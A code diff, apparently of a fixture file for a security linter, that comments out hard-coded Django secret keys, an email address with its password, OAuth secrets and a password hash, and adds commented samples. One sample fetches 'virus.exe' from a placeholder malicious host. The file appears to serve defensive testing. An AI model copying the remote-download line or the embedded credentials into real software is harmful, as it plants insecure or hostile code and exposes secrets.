@@ -1,14 +1,18 @@
-SECRET_KEY = 'e^h9#%6uqkyy8ef8&6mzc@&v9n!25(h#%d59ossolktzt_om4@'
-self.user = User.objects.create_user('foo', password='pass')
-twitter_social_app = SocialApp.objects.create( provider='twitter', name='Twitter', client_id='11223344', secret='55667788')
+# grant_access(get_name( get_pwd(pwd = 'ij123xyz')))
+# self.do_something(requests.get('http://www.malicious.com/files?file=virus.exe'))
 
-EMAIL_HOST_USER = "18500611672@sina.cn"
-EMAIL_HOST_PASSWORD = "zz1123581321"
-SECRET_KEY = 'qzk7a803m2d6_ngccq$jh&8#90m!19qfr^s39#ay6#_*ri5ap+'
-MAIL_PASSWORD = 'password'
-admin = 'admin'
+# SECRET_KEY = 'e^h9#%6uqkyy8ef8&6mzc@&v9n!25(h#%d59ossolktzt_om4@'
+self.user = User.objects.create_user('foo', password = 'pass')
+self.admin = 'admin'
+# twitter_social_app = SocialApp.objects.create( provider='twitter', name='Twitter', client_id='11223344', secret='55667788')
+
+# EMAIL_HOST_USER = "18500611672@sina.cn"
+# EMAIL_HOST_PASSWORD = "zz1123581321"
+# SECRET_KEY = 'qzk7a803m2d6_ngccq$jh&8#90m!19qfr^s39#ay6#_*ri5ap+'
+# MAIL_PASSWORD = 'password'
+# admin = 'admin'
 # pylint_token = "R0902"
-password='pbkdf2_sha256$36000$HizLkJV9vzk4$++1pBxJlH/uqIn5Qx0jugTH1b3U5SyZTaqnm+kSk7pQ='
+# password='pbkdf2_sha256$36000$HizLkJV9vzk4$++1pBxJlH/uqIn5Qx0jugTH1b3U5SyZTaqnm+kSk7pQ='
 
 
 # from sqlalchemy import text
@@ -66,6 +70,8 @@ password='pbkdf2_sha256$36000$HizLkJV9vzk4$++1pBxJlH/uqIn5Qx0jugTH1b3U5SyZTaqnm+
 # pass1 = ahc.gsdf.sjagdshj()
 # pass1 = password
 
+# name = str(input('wassup man? got a name?_'))
+
 # tokens = {'user': 'root', 'pwd': '1h23ighwdvssedw23'}
 # def grant_access(username = 'guest', password = 'guest'):
 #    pass
@@ -78,8 +84,9 @@ password='pbkdf2_sha256$36000$HizLkJV9vzk4$++1pBxJlH/uqIn5Qx0jugTH1b3U5SyZTaqnm+
 # port = '3030'
 
 # s = socket.socket(AF.NET,IO.SOCKET)
-# s.bind(ip,port)
 # s.bind('0.0.0.0','3030')
+
+# s.bind(ip,port)
 
 # subprocess.call(['chmod', '0444', 'path'])
 
